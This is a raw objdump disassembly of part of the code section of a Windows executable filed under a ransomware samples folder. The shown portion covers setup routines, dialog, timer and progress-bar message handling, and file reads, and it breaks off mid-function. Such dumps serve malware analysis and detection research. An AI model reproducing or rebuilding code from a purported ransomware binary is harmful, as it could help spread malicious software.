
malware_samples/ransomware/050c6b14a0308fc4adbafec1465b2202b8d378b0e8df7cce38b04e35772b04f3.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	6a ff                	push   $0xffffffff
  401002:	68 58 34 41 00       	push   $0x413458
  401007:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40100d:	50                   	push   %eax
  40100e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401015:	51                   	push   %ecx
  401016:	8b 44 24 14          	mov    0x14(%esp),%eax
  40101a:	53                   	push   %ebx
  40101b:	56                   	push   %esi
  40101c:	57                   	push   %edi
  40101d:	8b f1                	mov    %ecx,%esi
  40101f:	50                   	push   %eax
  401020:	68 8d 00 00 00       	push   $0x8d
  401025:	89 74 24 14          	mov    %esi,0x14(%esp)
  401029:	e8 64 1c 01 00       	call   0x412c92
  40102e:	8d 7e 60             	lea    0x60(%esi),%edi
  401031:	33 db                	xor    %ebx,%ebx
  401033:	8b cf                	mov    %edi,%ecx
  401035:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  401039:	e8 4e 1c 01 00       	call   0x412c8c
  40103e:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401042:	c7 07 f0 57 41 00    	movl   $0x4157f0,(%edi)
  401048:	c7 06 18 57 41 00    	movl   $0x415718,(%esi)
  40104e:	89 9e b4 00 00 00    	mov    %ebx,0xb4(%esi)
  401054:	c7 86 a0 00 00 00 01 	movl   $0x1,0xa0(%esi)
  40105b:	00 00 00 
  40105e:	89 9e ac 00 00 00    	mov    %ebx,0xac(%esi)
  401064:	89 9e a4 00 00 00    	mov    %ebx,0xa4(%esi)
  40106a:	8b c6                	mov    %esi,%eax
  40106c:	5f                   	pop    %edi
  40106d:	5e                   	pop    %esi
  40106e:	5b                   	pop    %ebx
  40106f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401076:	83 c4 10             	add    $0x10,%esp
  401079:	c2 04 00             	ret    $0x4
  40107c:	90                   	nop
  40107d:	90                   	nop
  40107e:	90                   	nop
  40107f:	90                   	nop
  401080:	c3                   	ret
  401081:	90                   	nop
  401082:	90                   	nop
  401083:	90                   	nop
  401084:	90                   	nop
  401085:	90                   	nop
  401086:	90                   	nop
  401087:	90                   	nop
  401088:	90                   	nop
  401089:	90                   	nop
  40108a:	90                   	nop
  40108b:	90                   	nop
  40108c:	90                   	nop
  40108d:	90                   	nop
  40108e:	90                   	nop
  40108f:	90                   	nop
  401090:	c2 04 00             	ret    $0x4
  401093:	90                   	nop
  401094:	90                   	nop
  401095:	90                   	nop
  401096:	90                   	nop
  401097:	90                   	nop
  401098:	90                   	nop
  401099:	90                   	nop
  40109a:	90                   	nop
  40109b:	90                   	nop
  40109c:	90                   	nop
  40109d:	90                   	nop
  40109e:	90                   	nop
  40109f:	90                   	nop
  4010a0:	56                   	push   %esi
  4010a1:	8b f1                	mov    %ecx,%esi
  4010a3:	e8 18 00 00 00       	call   0x4010c0
  4010a8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  4010ad:	74 09                	je     0x4010b8
  4010af:	56                   	push   %esi
  4010b0:	e8 e3 1b 01 00       	call   0x412c98
  4010b5:	83 c4 04             	add    $0x4,%esp
  4010b8:	8b c6                	mov    %esi,%eax
  4010ba:	5e                   	pop    %esi
  4010bb:	c2 04 00             	ret    $0x4
  4010be:	90                   	nop
  4010bf:	90                   	nop
  4010c0:	6a ff                	push   $0xffffffff
  4010c2:	68 78 34 41 00       	push   $0x413478
  4010c7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4010cd:	50                   	push   %eax
  4010ce:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4010d5:	51                   	push   %ecx
  4010d6:	56                   	push   %esi
  4010d7:	8b f1                	mov    %ecx,%esi
  4010d9:	89 74 24 04          	mov    %esi,0x4(%esp)
  4010dd:	8d 4e 60             	lea    0x60(%esi),%ecx
  4010e0:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4010e7:	00 
  4010e8:	e8 b1 1b 01 00       	call   0x412c9e
  4010ed:	8b ce                	mov    %esi,%ecx
  4010ef:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  4010f6:	ff 
  4010f7:	e8 8a 1b 01 00       	call   0x412c86
  4010fc:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401100:	5e                   	pop    %esi
  401101:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401108:	83 c4 10             	add    $0x10,%esp
  40110b:	c3                   	ret
  40110c:	90                   	nop
  40110d:	90                   	nop
  40110e:	90                   	nop
  40110f:	90                   	nop
  401110:	8b 44 24 04          	mov    0x4(%esp),%eax
  401114:	83 c1 60             	add    $0x60,%ecx
  401117:	51                   	push   %ecx
  401118:	68 f3 03 00 00       	push   $0x3f3
  40111d:	50                   	push   %eax
  40111e:	e8 81 1b 01 00       	call   0x412ca4
  401123:	c2 04 00             	ret    $0x4
  401126:	90                   	nop
  401127:	90                   	nop
  401128:	90                   	nop
  401129:	90                   	nop
  40112a:	90                   	nop
  40112b:	90                   	nop
  40112c:	90                   	nop
  40112d:	90                   	nop
  40112e:	90                   	nop
  40112f:	90                   	nop
  401130:	b8 c8 56 41 00       	mov    $0x4156c8,%eax
  401135:	c3                   	ret
  401136:	90                   	nop
  401137:	90                   	nop
  401138:	90                   	nop
  401139:	90                   	nop
  40113a:	90                   	nop
  40113b:	90                   	nop
  40113c:	90                   	nop
  40113d:	90                   	nop
  40113e:	90                   	nop
  40113f:	90                   	nop
  401140:	51                   	push   %ecx
  401141:	56                   	push   %esi
  401142:	57                   	push   %edi
  401143:	8b f1                	mov    %ecx,%esi
  401145:	e8 66 1b 01 00       	call   0x412cb0
  40114a:	8b 86 80 00 00 00    	mov    0x80(%esi),%eax
  401150:	8b 3d 30 56 41 00    	mov    0x415630,%edi
  401156:	6a 00                	push   $0x0
  401158:	6a 01                	push   $0x1
  40115a:	68 04 04 00 00       	push   $0x404
  40115f:	50                   	push   %eax
  401160:	ff d7                	call   *%edi
  401162:	8b 8e 80 00 00 00    	mov    0x80(%esi),%ecx
  401168:	68 00 00 28 00       	push   $0x280000
  40116d:	6a 00                	push   $0x0
  40116f:	68 01 04 00 00       	push   $0x401
  401174:	51                   	push   %ecx
  401175:	ff d7                	call   *%edi
  401177:	51                   	push   %ecx
  401178:	c7 86 b0 00 00 00 1e 	movl   $0x1e,0xb0(%esi)
  40117f:	00 00 00 
  401182:	8b cc                	mov    %esp,%ecx
  401184:	89 64 24 0c          	mov    %esp,0xc(%esp)
  401188:	68 3c fb 41 00       	push   $0x41fb3c
  40118d:	e8 18 1b 01 00       	call   0x412caa
  401192:	8b ce                	mov    %esi,%ecx
  401194:	e8 d7 07 00 00       	call   0x401970
  401199:	8b 56 20             	mov    0x20(%esi),%edx
  40119c:	6a 00                	push   $0x0
  40119e:	68 e8 03 00 00       	push   $0x3e8
  4011a3:	68 e9 03 00 00       	push   $0x3e9
  4011a8:	52                   	push   %edx
  4011a9:	c7 86 a8 00 00 00 00 	movl   $0x0,0xa8(%esi)
  4011b0:	00 00 00 
  4011b3:	ff 15 2c 56 41 00    	call   *0x41562c
  4011b9:	8b 86 a0 00 00 00    	mov    0xa0(%esi),%eax
  4011bf:	85 c0                	test   %eax,%eax
  4011c1:	74 1a                	je     0x4011dd
  4011c3:	6a 00                	push   $0x0
  4011c5:	6a 00                	push   $0x0
  4011c7:	56                   	push   %esi
  4011c8:	68 d0 12 40 00       	push   $0x4012d0
  4011cd:	6a 00                	push   $0x0
  4011cf:	6a 00                	push   $0x0
  4011d1:	ff 15 ac 50 41 00    	call   *0x4150ac
  4011d7:	89 86 ac 00 00 00    	mov    %eax,0xac(%esi)
  4011dd:	5f                   	pop    %edi
  4011de:	b8 01 00 00 00       	mov    $0x1,%eax
  4011e3:	5e                   	pop    %esi
  4011e4:	59                   	pop    %ecx
  4011e5:	c3                   	ret
  4011e6:	90                   	nop
  4011e7:	90                   	nop
  4011e8:	90                   	nop
  4011e9:	90                   	nop
  4011ea:	90                   	nop
  4011eb:	90                   	nop
  4011ec:	90                   	nop
  4011ed:	90                   	nop
  4011ee:	90                   	nop
  4011ef:	90                   	nop
  4011f0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4011f4:	81 78 04 00 01 00 00 	cmpl   $0x100,0x4(%eax)
  4011fb:	75 0e                	jne    0x40120b
  4011fd:	83 78 08 0d          	cmpl   $0xd,0x8(%eax)
  401201:	75 08                	jne    0x40120b
  401203:	b8 01 00 00 00       	mov    $0x1,%eax
  401208:	c2 04 00             	ret    $0x4
  40120b:	50                   	push   %eax
  40120c:	e8 a5 1a 01 00       	call   0x412cb6
  401211:	c2 04 00             	ret    $0x4
  401214:	90                   	nop
  401215:	90                   	nop
  401216:	90                   	nop
  401217:	90                   	nop
  401218:	90                   	nop
  401219:	90                   	nop
  40121a:	90                   	nop
  40121b:	90                   	nop
  40121c:	90                   	nop
  40121d:	90                   	nop
  40121e:	90                   	nop
  40121f:	90                   	nop
  401220:	8b 44 24 04          	mov    0x4(%esp),%eax
  401224:	56                   	push   %esi
  401225:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  40122a:	57                   	push   %edi
  40122b:	8b f1                	mov    %ecx,%esi
  40122d:	0f 85 8f 00 00 00    	jne    0x4012c2
  401233:	8b 86 a8 00 00 00    	mov    0xa8(%esi),%eax
  401239:	8b 3d 30 56 41 00    	mov    0x415630,%edi
  40123f:	85 c0                	test   %eax,%eax
  401241:	74 28                	je     0x40126b
  401243:	8b 86 80 00 00 00    	mov    0x80(%esi),%eax
  401249:	6a 00                	push   $0x0
  40124b:	6a 28                	push   $0x28
  40124d:	68 02 04 00 00       	push   $0x402
  401252:	50                   	push   %eax
  401253:	ff d7                	call   *%edi
  401255:	8b 4e 20             	mov    0x20(%esi),%ecx
  401258:	68 e9 03 00 00       	push   $0x3e9
  40125d:	51                   	push   %ecx
  40125e:	ff 15 60 56 41 00    	call   *0x415660
  401264:	8b ce                	mov    %esi,%ecx
  401266:	e8 fb 18 01 00       	call   0x412b66
  40126b:	8b 96 80 00 00 00    	mov    0x80(%esi),%edx
  401271:	6a 00                	push   $0x0
  401273:	6a 00                	push   $0x0
  401275:	68 08 04 00 00       	push   $0x408
  40127a:	52                   	push   %edx
  40127b:	ff d7                	call   *%edi
  40127d:	3b 86 b0 00 00 00    	cmp    0xb0(%esi),%eax
  401283:	7d 12                	jge    0x401297
  401285:	8b 86 80 00 00 00    	mov    0x80(%esi),%eax
  40128b:	6a 00                	push   $0x0
  40128d:	6a 00                	push   $0x0
  40128f:	68 05 04 00 00       	push   $0x405
  401294:	50                   	push   %eax
  401295:	ff d7                	call   *%edi
  401297:	8b 86 a0 00 00 00    	mov    0xa0(%esi),%eax
  40129d:	85 c0                	test   %eax,%eax
  40129f:	75 21                	jne    0x4012c2
  4012a1:	8b 8e 80 00 00 00    	mov    0x80(%esi),%ecx
  4012a7:	6a 00                	push   $0x0
  4012a9:	6a 00                	push   $0x0
  4012ab:	68 08 04 00 00       	push   $0x408
  4012b0:	51                   	push   %ecx
  4012b1:	ff d7                	call   *%edi
  4012b3:	83 f8 0f             	cmp    $0xf,%eax
  4012b6:	75 0a                	jne    0x4012c2
  4012b8:	c7 86 a8 00 00 00 ff 	movl   $0xffffffff,0xa8(%esi)
  4012bf:	ff ff ff 
  4012c2:	8b ce                	mov    %esi,%ecx
  4012c4:	e8 f3 19 01 00       	call   0x412cbc
  4012c9:	5f                   	pop    %edi
  4012ca:	5e                   	pop    %esi
  4012cb:	c2 04 00             	ret    $0x4
  4012ce:	90                   	nop
  4012cf:	90                   	nop
  4012d0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4012d4:	e8 07 00 00 00       	call   0x4012e0
  4012d9:	33 c0                	xor    %eax,%eax
  4012db:	c2 04 00             	ret    $0x4
  4012de:	90                   	nop
  4012df:	90                   	nop
  4012e0:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4012e6:	6a ff                	push   $0xffffffff
  4012e8:	68 a6 34 41 00       	push   $0x4134a6
  4012ed:	50                   	push   %eax
  4012ee:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4012f5:	81 ec e0 09 00 00    	sub    $0x9e0,%esp
  4012fb:	a1 9c 18 42 00       	mov    0x42189c,%eax
  401300:	8d 54 24 48          	lea    0x48(%esp),%edx
  401304:	53                   	push   %ebx
  401305:	55                   	push   %ebp
  401306:	56                   	push   %esi
  401307:	8b f1                	mov    %ecx,%esi
  401309:	57                   	push   %edi
  40130a:	8b 3d 3c 55 41 00    	mov    0x41553c,%edi
  401310:	8b 8e a4 00 00 00    	mov    0xa4(%esi),%ecx
  401316:	8d 98 0c 05 00 00    	lea    0x50c(%eax),%ebx
  40131c:	51                   	push   %ecx
  40131d:	68 94 fb 41 00       	push   $0x41fb94
  401322:	52                   	push   %edx
  401323:	ff d7                	call   *%edi
  401325:	8b 86 a4 00 00 00    	mov    0xa4(%esi),%eax
  40132b:	83 c4 0c             	add    $0xc,%esp
  40132e:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401332:	50                   	push   %eax
  401333:	68 88 fb 41 00       	push   $0x41fb88
  401338:	51                   	push   %ecx
  401339:	ff d7                	call   *%edi
  40133b:	83 c4 0c             	add    $0xc,%esp
  40133e:	8d 54 24 10          	lea    0x10(%esp),%edx
  401342:	52                   	push   %edx
  401343:	ff 15 a4 50 41 00    	call   *0x4150a4
  401349:	83 cd ff             	or     $0xffffffff,%ebp
  40134c:	3b c5                	cmp    %ebp,%eax
  40134e:	74 60                	je     0x4013b0
  401350:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  401354:	e8 e7 32 00 00       	call   0x404640
  401359:	8d 44 24 10          	lea    0x10(%esp),%eax
  40135d:	8d 4c 24 58          	lea    0x58(%esp),%ecx
  401361:	50                   	push   %eax
  401362:	51                   	push   %ecx
  401363:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  401367:	c7 84 24 00 0a 00 00 	movl   $0x0,0xa00(%esp)
  40136e:	00 00 00 00 
  401372:	e8 49 34 00 00       	call   0x4047c0
  401377:	85 c0                	test   %eax,%eax
  401379:	74 1a                	je     0x401395
  40137b:	c7 86 a8 00 00 00 02 	movl   $0x2,0xa8(%esi)
  401382:	00 00 00 
  401385:	89 ac 24 f8 09 00 00 	mov    %ebp,0x9f8(%esp)
  40138c:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  401390:	e9 3e 02 00 00       	jmp    0x4015d3
  401395:	8d 54 24 10          	lea    0x10(%esp),%edx
  401399:	52                   	push   %edx
  40139a:	ff 15 a8 50 41 00    	call   *0x4150a8
  4013a0:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  4013a4:	89 ac 24 f8 09 00 00 	mov    %ebp,0x9f8(%esp)
  4013ab:	e8 e0 32 00 00       	call   0x404690
  4013b0:	b9 21 00 00 00       	mov    $0x21,%ecx
  4013b5:	33 c0                	xor    %eax,%eax
  4013b7:	8d bc 24 6c 01 00 00 	lea    0x16c(%esp),%edi
  4013be:	c7 84 24 68 01 00 00 	movl   $0x0,0x168(%esp)
  4013c5:	00 00 00 00 
  4013c9:	68 84 fb 41 00       	push   $0x41fb84
  4013ce:	68 74 fb 41 00       	push   $0x41fb74
  4013d3:	f3 ab                	rep stos %eax,%es:(%edi)
  4013d5:	ff 15 38 55 41 00    	call   *0x415538
  4013db:	8b f8                	mov    %eax,%edi
  4013dd:	83 c4 08             	add    $0x8,%esp
  4013e0:	85 ff                	test   %edi,%edi
  4013e2:	75 0b                	jne    0x4013ef
  4013e4:	89 ae a8 00 00 00    	mov    %ebp,0xa8(%esi)
  4013ea:	e9 e9 01 00 00       	jmp    0x4015d8
  4013ef:	8b 2d 34 55 41 00    	mov    0x415534,%ebp
  4013f5:	57                   	push   %edi
  4013f6:	6a 01                	push   $0x1
  4013f8:	8d 84 24 70 01 00 00 	lea    0x170(%esp),%eax
  4013ff:	68 88 00 00 00       	push   $0x88
  401404:	50                   	push   %eax
  401405:	ff d5                	call   *%ebp
  401407:	57                   	push   %edi
  401408:	ff 15 30 55 41 00    	call   *0x415530
  40140e:	b9 21 00 00 00       	mov    $0x21,%ecx
  401413:	33 c0                	xor    %eax,%eax
  401415:	8d bc 24 f8 00 00 00 	lea    0xf8(%esp),%edi
  40141c:	c7 84 24 f4 00 00 00 	movl   $0x0,0xf4(%esp)
  401423:	00 00 00 00 
  401427:	f3 ab                	rep stos %eax,%es:(%edi)
  401429:	8b 8e a4 00 00 00    	mov    0xa4(%esi),%ecx
  40142f:	83 c4 14             	add    $0x14,%esp
  401432:	8d 94 24 c0 00 00 00 	lea    0xc0(%esp),%edx
  401439:	51                   	push   %ecx
  40143a:	68 68 fb 41 00       	push   $0x41fb68
  40143f:	52                   	push   %edx
  401440:	ff 15 3c 55 41 00    	call   *0x41553c
  401446:	8d 84 24 cc 00 00 00 	lea    0xcc(%esp),%eax
  40144d:	68 84 fb 41 00       	push   $0x41fb84
  401452:	50                   	push   %eax
  401453:	ff 15 38 55 41 00    	call   *0x415538
  401459:	8b f8                	mov    %eax,%edi
  40145b:	83 c4 14             	add    $0x14,%esp
  40145e:	85 ff                	test   %edi,%edi
  401460:	75 0f                	jne    0x401471
  401462:	c7 86 a8 00 00 00 ff 	movl   $0xffffffff,0xa8(%esi)
  401469:	ff ff ff 
  40146c:	e9 67 01 00 00       	jmp    0x4015d8
  401471:	57                   	push   %edi
  401472:	6a 01                	push   $0x1
  401474:	8d 8c 24 e8 00 00 00 	lea    0xe8(%esp),%ecx
  40147b:	68 88 00 00 00       	push   $0x88
  401480:	51                   	push   %ecx
  401481:	ff d5                	call   *%ebp
  401483:	57                   	push   %edi
  401484:	ff 15 30 55 41 00    	call   *0x415530
  40148a:	8a 15 98 17 42 00    	mov    0x421798,%dl
  401490:	b9 ff 01 00 00       	mov    $0x1ff,%ecx
  401495:	33 c0                	xor    %eax,%eax
  401497:	8d bc 24 05 02 00 00 	lea    0x205(%esp),%edi
  40149e:	88 94 24 04 02 00 00 	mov    %dl,0x204(%esp)
  4014a5:	83 c4 14             	add    $0x14,%esp
  4014a8:	f3 ab                	rep stos %eax,%es:(%edi)
  4014aa:	66 ab                	stos   %ax,%es:(%edi)
  4014ac:	aa                   	stos   %al,%es:(%edi)
  4014ad:	8b 86 a4 00 00 00    	mov    0xa4(%esi),%eax
  4014b3:	8d 8c 24 a0 00 00 00 	lea    0xa0(%esp),%ecx
  4014ba:	50                   	push   %eax
  4014bb:	68 5c fb 41 00       	push   $0x41fb5c
  4014c0:	51                   	push   %ecx
  4014c1:	ff 15 3c 55 41 00    	call   *0x41553c
  4014c7:	8d 94 24 ac 00 00 00 	lea    0xac(%esp),%edx
  4014ce:	68 84 fb 41 00       	push   $0x41fb84
  4014d3:	52                   	push   %edx
  4014d4:	ff 15 38 55 41 00    	call   *0x415538
  4014da:	8b f8                	mov    %eax,%edi
  4014dc:	83 c4 14             	add    $0x14,%esp
  4014df:	85 ff                	test   %edi,%edi
  4014e1:	75 0f                	jne    0x4014f2
  4014e3:	c7 86 a8 00 00 00 ff 	movl   $0xffffffff,0xa8(%esi)
  4014ea:	ff ff ff 
  4014ed:	e9 e6 00 00 00       	jmp    0x4015d8
  4014f2:	57                   	push   %edi
  4014f3:	68 00 08 00 00       	push   $0x800
  4014f8:	8d 84 24 f8 01 00 00 	lea    0x1f8(%esp),%eax
  4014ff:	6a 01                	push   $0x1
  401501:	50                   	push   %eax
  401502:	ff d5                	call   *%ebp
  401504:	57                   	push   %edi
  401505:	8b e8                	mov    %eax,%ebp
  401507:	ff 15 30 55 41 00    	call   *0x415530
  40150d:	8d 8b 42 02 00 00    	lea    0x242(%ebx),%ecx
  401513:	8d 93 de 01 00 00    	lea    0x1de(%ebx),%edx
  401519:	51                   	push   %ecx
  40151a:	52                   	push   %edx
  40151b:	68 54 fb 41 00       	push   $0x41fb54
  401520:	e8 6b a9 00 00       	call   0x40be90
  401525:	a1 9c 18 42 00       	mov    0x42189c,%eax
  40152a:	8b 56 20             	mov    0x20(%esi),%edx
  40152d:	52                   	push   %edx
  40152e:	8d 54 24 34          	lea    0x34(%esp),%edx
  401532:	8b 88 1c 08 00 00    	mov    0x81c(%eax),%ecx
  401538:	8b 80 18 08 00 00    	mov    0x818(%eax),%eax
  40153e:	52                   	push   %edx
  40153f:	50                   	push   %eax
  401540:	8b 84 24 14 01 00 00 	mov    0x114(%esp),%eax
  401547:	51                   	push   %ecx
  401548:	8d 8b b2 00 00 00    	lea    0xb2(%ebx),%ecx
  40154e:	8d 94 24 20 02 00 00 	lea    0x220(%esp),%edx
  401555:	51                   	push   %ecx
  401556:	55                   	push   %ebp
  401557:	52                   	push   %edx
  401558:	8d 8c 24 1c 01 00 00 	lea    0x11c(%esp),%ecx
  40155f:	50                   	push   %eax
  401560:	8d 94 24 a8 01 00 00 	lea    0x1a8(%esp),%edx
  401567:	51                   	push   %ecx
  401568:	81 c3 e4 00 00 00    	add    $0xe4,%ebx
  40156e:	52                   	push   %edx
  40156f:	53                   	push   %ebx
  401570:	e8 cb ac 00 00       	call   0x40c240
  401575:	83 c4 4c             	add    $0x4c,%esp
  401578:	8b f8                	mov    %eax,%edi
  40157a:	e8 f1 b0 00 00       	call   0x40c670
  40157f:	85 ff                	test   %edi,%edi
  401581:	7c 55                	jl     0x4015d8
  401583:	8d 4c 24 78          	lea    0x78(%esp),%ecx
  401587:	e8 b4 30 00 00       	call   0x404640
  40158c:	8d 44 24 10          	lea    0x10(%esp),%eax
  401590:	8d 4c 24 58          	lea    0x58(%esp),%ecx
  401594:	50                   	push   %eax
  401595:	bf 01 00 00 00       	mov    $0x1,%edi
  40159a:	51                   	push   %ecx
  40159b:	8d 8c 24 80 00 00 00 	lea    0x80(%esp),%ecx
  4015a2:	89 bc 24 00 0a 00 00 	mov    %edi,0xa00(%esp)
  4015a9:	e8 12 32 00 00       	call   0x4047c0
  4015ae:	85 c0                	test   %eax,%eax
  4015b0:	74 0c                	je     0x4015be
  4015b2:	c7 86 a8 00 00 00 02 	movl   $0x2,0xa8(%esi)
  4015b9:	00 00 00 
  4015bc:	eb 06                	jmp    0x4015c4
  4015be:	89 be a8 00 00 00    	mov    %edi,0xa8(%esi)
  4015c4:	c7 84 24 f8 09 00 00 	movl   $0xffffffff,0x9f8(%esp)
  4015cb:	ff ff ff ff 
  4015cf:	8d 4c 24 78          	lea    0x78(%esp),%ecx
  4015d3:	e8 b8 30 00 00       	call   0x404690
  4015d8:	8b 8c 24 f0 09 00 00 	mov    0x9f0(%esp),%ecx
  4015df:	5f                   	pop    %edi
  4015e0:	5e                   	pop    %esi
  4015e1:	5d                   	pop    %ebp
  4015e2:	5b                   	pop    %ebx
  4015e3:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4015ea:	81 c4 ec 09 00 00    	add    $0x9ec,%esp
  4015f0:	c3                   	ret
  4015f1:	90                   	nop
  4015f2:	90                   	nop
  4015f3:	90                   	nop
  4015f4:	90                   	nop
  4015f5:	90                   	nop
  4015f6:	90                   	nop
  4015f7:	90                   	nop
  4015f8:	90                   	nop
  4015f9:	90                   	nop
  4015fa:	90                   	nop
  4015fb:	90                   	nop
  4015fc:	90                   	nop
  4015fd:	90                   	nop
  4015fe:	90                   	nop
  4015ff:	90                   	nop
  401600:	53                   	push   %ebx
  401601:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  401605:	8b c3                	mov    %ebx,%eax
  401607:	56                   	push   %esi
  401608:	57                   	push   %edi
  401609:	8b 7c 24 14          	mov    0x14(%esp),%edi
  40160d:	2d 20 4e 00 00       	sub    $0x4e20,%eax
  401612:	8b f1                	mov    %ecx,%esi
  401614:	0f 84 cb 00 00 00    	je     0x4016e5
  40161a:	48                   	dec    %eax
  40161b:	74 72                	je     0x40168f
  40161d:	48                   	dec    %eax
  40161e:	0f 85 1f 01 00 00    	jne    0x401743
  401624:	85 ff                	test   %edi,%edi
  401626:	75 36                	jne    0x40165e
  401628:	51                   	push   %ecx
  401629:	8b cc                	mov    %esp,%ecx
  40162b:	89 64 24 14          	mov    %esp,0x14(%esp)
  40162f:	68 c4 fb 41 00       	push   $0x41fbc4
  401634:	e8 71 16 01 00       	call   0x412caa
  401639:	8b ce                	mov    %esi,%ecx
  40163b:	e8 30 03 00 00       	call   0x401970
  401640:	8b 54 24 18          	mov    0x18(%esp),%edx
  401644:	8b ce                	mov    %esi,%ecx
  401646:	52                   	push   %edx
  401647:	57                   	push   %edi
  401648:	53                   	push   %ebx
  401649:	c7 86 a8 00 00 00 01 	movl   $0x1,0xa8(%esi)
  401650:	00 00 00 
  401653:	e8 56 15 01 00       	call   0x412bae
  401658:	5f                   	pop    %edi
  401659:	5e                   	pop    %esi
  40165a:	5b                   	pop    %ebx
  40165b:	c2 0c 00             	ret    $0xc
  40165e:	83 ff 01             	cmp    $0x1,%edi
  401661:	75 7b                	jne    0x4016de
  401663:	51                   	push   %ecx
  401664:	8b cc                	mov    %esp,%ecx
  401666:	89 64 24 14          	mov    %esp,0x14(%esp)
  40166a:	68 bc fb 41 00       	push   $0x41fbbc
  40166f:	e8 36 16 01 00       	call   0x412caa
  401674:	8b ce                	mov    %esi,%ecx
  401676:	e8 f5 02 00 00       	call   0x401970
  40167b:	8b 54 24 18          	mov    0x18(%esp),%edx
  40167f:	8b ce                	mov    %esi,%ecx
  401681:	52                   	push   %edx
  401682:	57                   	push   %edi
  401683:	53                   	push   %ebx
  401684:	e8 25 15 01 00       	call   0x412bae
  401689:	5f                   	pop    %edi
  40168a:	5e                   	pop    %esi
  40168b:	5b                   	pop    %ebx
  40168c:	c2 0c 00             	ret    $0xc
  40168f:	85 ff                	test   %edi,%edi
  401691:	75 4b                	jne    0x4016de
  401693:	51                   	push   %ecx
  401694:	8b cc                	mov    %esp,%ecx
  401696:	89 64 24 14          	mov    %esp,0x14(%esp)
  40169a:	68 ac fb 41 00       	push   $0x41fbac
  40169f:	e8 06 16 01 00       	call   0x412caa
  4016a4:	8b ce                	mov    %esi,%ecx
  4016a6:	e8 c5 02 00 00       	call   0x401970
  4016ab:	8b 86 80 00 00 00    	mov    0x80(%esi),%eax
  4016b1:	57                   	push   %edi
  4016b2:	6a 23                	push   $0x23
  4016b4:	68 02 04 00 00       	push   $0x402
  4016b9:	50                   	push   %eax
  4016ba:	ff 15 30 56 41 00    	call   *0x415630
  4016c0:	8b 54 24 18          	mov    0x18(%esp),%edx
  4016c4:	8b ce                	mov    %esi,%ecx
  4016c6:	52                   	push   %edx
  4016c7:	57                   	push   %edi
  4016c8:	53                   	push   %ebx
  4016c9:	c7 86 b0 00 00 00 28 	movl   $0x28,0xb0(%esi)
  4016d0:	00 00 00 
  4016d3:	e8 d6 14 01 00       	call   0x412bae
  4016d8:	5f                   	pop    %edi
  4016d9:	5e                   	pop    %esi
  4016da:	5b                   	pop    %ebx
  4016db:	c2 0c 00             	ret    $0xc
  4016de:	83 ff ff             	cmp    $0xffffffff,%edi
  4016e1:	75 60                	jne    0x401743
  4016e3:	eb 54                	jmp    0x401739
  4016e5:	85 ff                	test   %edi,%edi
  4016e7:	75 4b                	jne    0x401734
  4016e9:	51                   	push   %ecx
  4016ea:	8b cc                	mov    %esp,%ecx
  4016ec:	89 64 24 14          	mov    %esp,0x14(%esp)
  4016f0:	68 a0 fb 41 00       	push   $0x41fba0
  4016f5:	e8 b0 15 01 00       	call   0x412caa
  4016fa:	8b ce                	mov    %esi,%ecx
  4016fc:	e8 6f 02 00 00       	call   0x401970
  401701:	8b 8e 80 00 00 00    	mov    0x80(%esi),%ecx
  401707:	57                   	push   %edi
  401708:	6a 1e                	push   $0x1e
  40170a:	68 02 04 00 00       	push   $0x402
  40170f:	51                   	push   %ecx
  401710:	ff 15 30 56 41 00    	call   *0x415630
  401716:	8b 54 24 18          	mov    0x18(%esp),%edx
  40171a:	8b ce                	mov    %esi,%ecx
  40171c:	52                   	push   %edx
  40171d:	57                   	push   %edi
  40171e:	53                   	push   %ebx
  40171f:	c7 86 b0 00 00 00 23 	movl   $0x23,0xb0(%esi)
  401726:	00 00 00 
  401729:	e8 80 14 01 00       	call   0x412bae
  40172e:	5f                   	pop    %edi
  40172f:	5e                   	pop    %esi
  401730:	5b                   	pop    %ebx
  401731:	c2 0c 00             	ret    $0xc
  401734:	83 ff ff             	cmp    $0xffffffff,%edi
  401737:	75 0a                	jne    0x401743
  401739:	c7 86 a8 00 00 00 ff 	movl   $0xffffffff,0xa8(%esi)
  401740:	ff ff ff 
  401743:	8b 54 24 18          	mov    0x18(%esp),%edx
  401747:	8b ce                	mov    %esi,%ecx
  401749:	52                   	push   %edx
  40174a:	57                   	push   %edi
  40174b:	53                   	push   %ebx
  40174c:	e8 5d 14 01 00       	call   0x412bae
  401751:	5f                   	pop    %edi
  401752:	5e                   	pop    %esi
  401753:	5b                   	pop    %ebx
  401754:	c2 0c 00             	ret    $0xc
  401757:	90                   	nop
  401758:	90                   	nop
  401759:	90                   	nop
  40175a:	90                   	nop
  40175b:	90                   	nop
  40175c:	90                   	nop
  40175d:	90                   	nop
  40175e:	90                   	nop
  40175f:	90                   	nop
  401760:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401766:	6a ff                	push   $0xffffffff
  401768:	68 c6 34 41 00       	push   $0x4134c6
  40176d:	50                   	push   %eax
  40176e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401775:	81 ec 28 0a 00 00    	sub    $0xa28,%esp
  40177b:	53                   	push   %ebx
  40177c:	56                   	push   %esi
  40177d:	57                   	push   %edi
  40177e:	8b f1                	mov    %ecx,%esi
